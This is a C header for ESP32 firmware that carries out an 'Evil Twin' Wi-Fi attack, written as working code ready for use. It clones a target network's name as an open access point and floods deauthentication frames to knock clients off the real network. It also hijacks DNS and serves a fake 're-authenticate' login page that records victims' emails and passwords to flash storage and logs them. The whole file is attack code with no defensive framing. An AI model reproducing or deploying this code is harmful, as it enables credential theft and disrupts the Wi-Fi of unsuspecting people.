// evil_twin.h - Evil Twin Attack (Clone AP + Deauth Original)
#ifndef EVIL_TWIN_H
#define EVIL_TWIN_H

#include <stdint.h>
#include <string.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_event.h"
#include "esp_log.h"
#include <sys/stat.h>
#include "esp_netif.h"
#include "esp_http_server.h"
#include "dns_server.h"
#include "esp_spiffs.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

// MAC address formatting macros (in case not defined)
#ifndef MACSTR
#define MACSTR "%02x:%02x:%02x:%02x:%02x:%02x"
#endif
#ifndef MAC2STR
#define MAC2STR(a) (a)[0], (a)[1], (a)[2], (a)[3], (a)[4], (a)[5]
#endif

#define EVIL_TWIN_MAX_SSID 32

static const char *EVIL_TWIN_TAG = "Evil_Twin";

typedef struct {
    uint8_t running;
    uint8_t deauth_enabled;
    char target_ssid[33];
    uint8_t target_bssid[6];
    uint8_t target_channel;
    int8_t target_rssi;
    
    // Victim tracking
    uint32_t total_deauths;
    uint32_t victims_connected;
    uint32_t credentials_captured;
    
    // Components
    httpd_handle_t http_server;
    dns_server_handle_t dns_server;
    TaskHandle_t deauth_task;
} EvilTwin;

static EvilTwin evil_twin = {0};

// Event handler for AP connections
static void evil_twin_event_handler(void *arg, esp_event_base_t event_base,
                                    int32_t event_id, void *event_data) {
    if (event_id == WIFI_EVENT_AP_STACONNECTED) {
        wifi_event_ap_staconnected_t *event = (wifi_event_ap_staconnected_t *)event_data;
        evil_twin.victims_connected++;
        
        ESP_LOGI(EVIL_TWIN_TAG, "🎯 VICTIM CONNECTED: " MACSTR, MAC2STR(event->mac));
        ESP_LOGI(EVIL_TWIN_TAG, "   Total victims: %lu", evil_twin.victims_connected);
    } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) {
        wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t *)event_data;
        ESP_LOGI(EVIL_TWIN_TAG, "Victim disconnected: " MACSTR, MAC2STR(event->mac));
    }
}

// Deauth frame structure
typedef struct __attribute__((packed)) {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t destination[6];
    uint8_t source[6];
    uint8_t bssid[6];
    uint8_t seq_ctrl[2];
    uint8_t reason[2];
} deauth_frame_t;

// Send deauth frame to disconnect victims from real AP
static void send_deauth_frame(uint8_t *bssid, uint8_t *client) {
    deauth_frame_t deauth = {0};
    
    deauth.frame_ctrl[0] = 0xC0; // Deauth
    deauth.frame_ctrl[1] = 0x00;
    
    memcpy(deauth.destination, client, 6);
    memcpy(deauth.source, bssid, 6);
    memcpy(deauth.bssid, bssid, 6);
    
    static uint16_t seq = 0;
    deauth.seq_ctrl[0] = (seq & 0x0F) << 4;
    deauth.seq_ctrl[1] = (seq >> 4) & 0xFF;
    seq++;
    
    deauth.reason[0] = 0x07; // Class 3 frame from nonassociated STA
    deauth.reason[1] = 0x00;
    
    esp_wifi_80211_tx(WIFI_IF_AP, &deauth, sizeof(deauth_frame_t), false);
    evil_twin.total_deauths++;
}

// Continuous deauth task to keep kicking victims off real AP
static void evil_twin_deauth_task(void *param) {
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    ESP_LOGI(EVIL_TWIN_TAG, "🔥 Deauth task started - attacking: %s", evil_twin.target_ssid);
    ESP_LOGI(EVIL_TWIN_TAG, "   BSSID: " MACSTR, MAC2STR(evil_twin.target_bssid));
    ESP_LOGI(EVIL_TWIN_TAG, "   Channel: %d", evil_twin.target_channel);
    
    // Suppress ESP-IDF deauth warnings
    esp_log_level_set("wifi", ESP_LOG_ERROR);
    
    while (evil_twin.deauth_enabled && evil_twin.running) {
        // Set to target channel
        esp_wifi_set_channel(evil_twin.target_channel, WIFI_SECOND_CHAN_NONE);
        
        // Send broadcast deauth (kicks ALL clients)
        for (uint8_t i = 0; i < 5; i++) {
            send_deauth_frame(evil_twin.target_bssid, broadcast);
            send_deauth_frame(broadcast, evil_twin.target_bssid);
        }
        
        // Log stats every 10 seconds
        static uint32_t last_log = 0;
        uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
        if (now - last_log > 10000) {
            ESP_LOGI(EVIL_TWIN_TAG, "📊 Deauths sent: %lu | Victims: %lu", 
                     evil_twin.total_deauths, evil_twin.victims_connected);
            last_log = now;
        }
        
        vTaskDelay(pdMS_TO_TICKS(100)); // Deauth every 100ms
    }
    
    ESP_LOGI(EVIL_TWIN_TAG, "Deauth task stopped");
    evil_twin.deauth_task = NULL;
    vTaskDelete(NULL);
}

// Portal page handler
static esp_err_t evil_twin_portal_handler(httpd_req_t *req) {
    ESP_LOGI(EVIL_TWIN_TAG, "Serving portal page to victim");
    
    // Try to load custom portal from SPIFFS
    FILE *f = fopen("/spiffs/sites/portal.html", "r");
    if (f) {
        fseek(f, 0, SEEK_END);
        long sz = ftell(f);
        fseek(f, 0, SEEK_SET);
        if (sz > 0 && sz < 32768) {
            char *html = malloc(sz + 1);
            if (html) {
                size_t rd = fread(html, 1, sz, f);
                html[rd] = 0;
                fclose(f);
                httpd_resp_set_type(req, "text/html");
                httpd_resp_send(req, html, rd);
                free(html);
                return ESP_OK;
            }
        }
        fclose(f);
    }
    
    // Fallback to default portal
    const char *portal = 
        "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<title>WiFi Authentication Required</title><style>"
        "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;"
        "max-width:400px;margin:50px auto;padding:20px;background:#f5f5f5}"
        "h2{text-align:center;color:#333}input{width:100%;padding:12px;margin:8px 0;"
        "box-sizing:border-box;border:1px solid #ddd;border-radius:6px;font-size:16px}"
        "button{width:100%;padding:14px;background:#007bff;color:#fff;border:none;"
        "border-radius:6px;font-size:16px;cursor:pointer}"
        "button:hover{background:#0056b3}"
        ".c{background:#fff;padding:30px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,.1)}"
        ".warn{background:#fff3cd;border:1px solid #ffc107;border-radius:6px;padding:12px;"
        "margin-bottom:20px;color:#856404;text-align:center}"
        "</style></head><body><div class='warn'>⚠️ Connection Lost - Please Re-authenticate</div>"
        "<div class='c'><h2>WiFi Network</h2><h3 style='text-align:center;color:#666'>"
        "%s</h3>"
        "<form method='POST' action='/submit'>"
        "<input name='email' placeholder='Email or Username' required>"
        "<input type='password' name='password' placeholder='Password' required>"
        "<button type='submit'>Connect</button></form></div></body></html>";
    
    char response[2048];
    snprintf(response, sizeof(response), portal, evil_twin.target_ssid);
    
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, response, strlen(response));
    return ESP_OK;
}

// Credential submission handler
static esp_err_t evil_twin_submit_handler(httpd_req_t *req) {
    char buf[512];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }
    buf[ret] = 0;
    
    char email[128] = {0}, password[128] = {0};
    char *p;
    
    // Parse credentials
    if ((p = strstr(buf, "email=")) != NULL) {
        p += 6;
        char *e = strchr(p, '&');
        if (!e) e = p + strlen(p);
        int l = e - p;
        if (l > 127) l = 127;
        strncpy(email, p, l);
    }
    if ((p = strstr(buf, "password=")) != NULL) {
        p += 9;
        char *e = strchr(p, '&');
        if (!e) e = p + strlen(p);
        int l = e - p;
        if (l > 127) l = 127;
        strncpy(password, p, l);
    }
    
    // Save to SPIFFS
    mkdir("/spiffs/captures", 0755);
    FILE *f = fopen("/spiffs/captures/credentials.txt", "a");
    if (f) {
        fprintf(f, "SSID: %s\nEmail: %s\nPassword: %s\n---\n", 
                evil_twin.target_ssid, email, password);
        fclose(f);
        evil_twin.credentials_captured++;
        
        ESP_LOGI(EVIL_TWIN_TAG, "💰 CREDENTIALS CAPTURED!");
        ESP_LOGI(EVIL_TWIN_TAG, "   SSID: %s", evil_twin.target_ssid);
        ESP_LOGI(EVIL_TWIN_TAG, "   Email: %s", email);
        ESP_LOGI(EVIL_TWIN_TAG, "   Password: %s", password);
        ESP_LOGI(EVIL_TWIN_TAG, "   Total captured: %lu", evil_twin.credentials_captured);
    }
    
    // Send "connecting" response
    const char *resp = 
        "<!DOCTYPE html><html><body style='font-family:sans-serif;text-align:center;padding:60px'>"
        "<h2>Authenticating...</h2><p>Please wait while we verify your credentials.</p>"
        "<script>setTimeout(function(){window.location='/';},3000);</script></body></html>";
    
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, resp, strlen(resp));
    return ESP_OK;
}

// 404 handler for captive portal detection
static esp_err_t evil_twin_404_handler(httpd_req_t *req, httpd_err_code_t err) {
    // Android/iOS captive portal detection
    if (strstr(req->uri, "generate_204") || strstr(req->uri, "gen_204") ||
        strstr(req->uri, "connectivitycheck") || strstr(req->uri, "hotspot-detect")) {
        httpd_resp_set_status(req, "200 OK");
        httpd_resp_set_type(req, "text/html");
        const char *redirect = "<html><head><meta http-equiv='refresh' content='0;url=http://192.168.4.1'></head></html>";
        httpd_resp_send(req, redirect, strlen(redirect));
        return ESP_OK;
    }
    
    // Standard redirect
    httpd_resp_set_status(req, "303 See Other");
    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1");
    httpd_resp_send(req, "Redirect", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

// Start Evil Twin attack
static inline uint8_t evil_twin_start(const char *target_ssid, uint8_t *target_bssid, 
                                      uint8_t target_channel, uint8_t enable_deauth) {
    if (evil_twin.running) {
        ESP_LOGW(EVIL_TWIN_TAG, "Already running");
        return 0;
    }
    
    ESP_LOGI(EVIL_TWIN_TAG, "🎭 Starting Evil Twin Attack");
    ESP_LOGI(EVIL_TWIN_TAG, "   Target SSID: %s", target_ssid);
    ESP_LOGI(EVIL_TWIN_TAG, "   Target BSSID: " MACSTR, MAC2STR(target_bssid));
    ESP_LOGI(EVIL_TWIN_TAG, "   Channel: %d", target_channel);
    ESP_LOGI(EVIL_TWIN_TAG, "   Deauth: %s", enable_deauth ? "ENABLED" : "DISABLED");
    
    // Store target info
    strncpy(evil_twin.target_ssid, target_ssid, 32);
    evil_twin.target_ssid[32] = '\0';
    memcpy(evil_twin.target_bssid, target_bssid, 6);
    evil_twin.target_channel = target_channel;
    evil_twin.deauth_enabled = enable_deauth;
    
    // Reset counters
    evil_twin.total_deauths = 0;
    evil_twin.victims_connected = 0;
    evil_twin.credentials_captured = 0;
    
    // Initialize network
    esp_err_t err;
    err = esp_netif_init();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
    
    err = esp_event_loop_create_default();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
    
    // Create AP interface
    esp_netif_t *ap_netif = esp_netif_create_default_wifi_ap();
    
    // Configure AP IP
    esp_netif_dhcps_stop(ap_netif);
    esp_netif_ip_info_t ap_ip;
    memset(&ap_ip, 0, sizeof(ap_ip));
    ap_ip.ip.addr = 0x0104A8C0;      // 192.168.4.1
    ap_ip.gw.addr = 0x0104A8C0;
    ap_ip.netmask.addr = 0x00FFFFFF; // 255.255.255.0
    esp_netif_set_ip_info(ap_netif, &ap_ip);
    esp_netif_dhcps_start(ap_netif);
    
    // Initialize WiFi
    wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&wifi_cfg));
    
    // Register event handler
    ESP_ERROR_CHECK(esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, 
                                                &evil_twin_event_handler, NULL));
    
    // Configure fake AP (clone target)
    wifi_config_t ap_config = {0};
    strncpy((char *)ap_config.ap.ssid, target_ssid, 32);
    ap_config.ap.ssid_len = strlen(target_ssid);
    ap_config.ap.channel = target_channel;
    ap_config.ap.max_connection = 8;
    ap_config.ap.authmode = WIFI_AUTH_OPEN; // Open network (easier to connect)
    ap_config.ap.beacon_interval = 100;
    
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    
    // Initialize SPIFFS for credential storage
    esp_vfs_spiffs_conf_t spiffs_conf = {
        .base_path = "/spiffs",
        .partition_label = NULL,
        .max_files = 5,
        .format_if_mount_failed = true
    };
    err = esp_vfs_spiffs_register(&spiffs_conf);
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
        ESP_LOGW(EVIL_TWIN_TAG, "SPIFFS: %s", esp_err_to_name(err));
    }
    mkdir("/spiffs/captures", 0755);
    mkdir("/spiffs/sites", 0755);
    
    // Start HTTP server for portal
    httpd_config_t http_config = HTTPD_DEFAULT_CONFIG();
    http_config.max_open_sockets = 7;
    http_config.lru_purge_enable = true;
    
    if (httpd_start(&evil_twin.http_server, &http_config) == ESP_OK) {
        httpd_uri_t uri_root = {
            .uri = "/",
            .method = HTTP_GET,
            .handler = evil_twin_portal_handler
        };
        httpd_register_uri_handler(evil_twin.http_server, &uri_root);
        
        httpd_uri_t uri_submit = {
            .uri = "/submit",
            .method = HTTP_POST,
            .handler = evil_twin_submit_handler
        };
        httpd_register_uri_handler(evil_twin.http_server, &uri_submit);
        
        httpd_register_err_handler(evil_twin.http_server, HTTPD_404_NOT_FOUND, 
                                   evil_twin_404_handler);
    }
    
    // Start DNS server (hijack all domains)
    dns_server_config_t dns_config = DNS_SERVER_CONFIG_SINGLE("*", "WIFI_AP_DEF");
    evil_twin.dns_server = start_dns_server(&dns_config);
    
    evil_twin.running = 1;
    
    // Start deauth task if enabled
    if (enable_deauth) {
        xTaskCreate(evil_twin_deauth_task, "evil_twin_deauth", 4096, NULL, 5, 
                   &evil_twin.deauth_task);
    }
    
    ESP_LOGI(EVIL_TWIN_TAG, "✅ Evil Twin Active!");
    ESP_LOGI(EVIL_TWIN_TAG, "   Fake AP: %s (Channel %d)", target_ssid, target_channel);
    ESP_LOGI(EVIL_TWIN_TAG, "   Portal: http://192.168.4.1");
    if (enable_deauth) {
        ESP_LOGI(EVIL_TWIN_TAG, "   Deauth: ATTACKING original AP");
    }
    
    return 1;
}

// Stop Evil Twin
static inline void evil_twin_stop(void) {
    if (!evil_twin.running) return;
    
    ESP_LOGI(EVIL_TWIN_TAG, "Stopping Evil Twin...");
    
    evil_twin.running = 0;
    evil_twin.deauth_enabled = 0;
    
    // Wait for deauth task to finish
    uint8_t wait = 0;
    while (evil_twin.deauth_task && wait++ < 50) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    // Stop DNS server
    if (evil_twin.dns_server) {
        stop_dns_server(evil_twin.dns_server);
        evil_twin.dns_server = NULL;
    }
    
    // Stop HTTP server
    if (evil_twin.http_server) {
        httpd_stop(evil_twin.http_server);
        evil_twin.http_server = NULL;
    }
    
    // Stop WiFi
    esp_wifi_stop();
    
    ESP_LOGI(EVIL_TWIN_TAG, "Evil Twin stopped");
    ESP_LOGI(EVIL_TWIN_TAG, "📊 Final Stats:");
    ESP_LOGI(EVIL_TWIN_TAG, "   Deauths sent: %lu", evil_twin.total_deauths);
    ESP_LOGI(EVIL_TWIN_TAG, "   Victims connected: %lu", evil_twin.victims_connected);
    ESP_LOGI(EVIL_TWIN_TAG, "   Credentials captured: %lu", evil_twin.credentials_captured);
}

// Get stats
static inline uint8_t evil_twin_is_running(void) {
    return evil_twin.running;
}

static inline EvilTwin* evil_twin_get_stats(void) {
    return &evil_twin;
}

static inline const char* evil_twin_get_target_ssid(void) {
    return evil_twin.target_ssid;
}

#endif // EVIL_TWIN_H
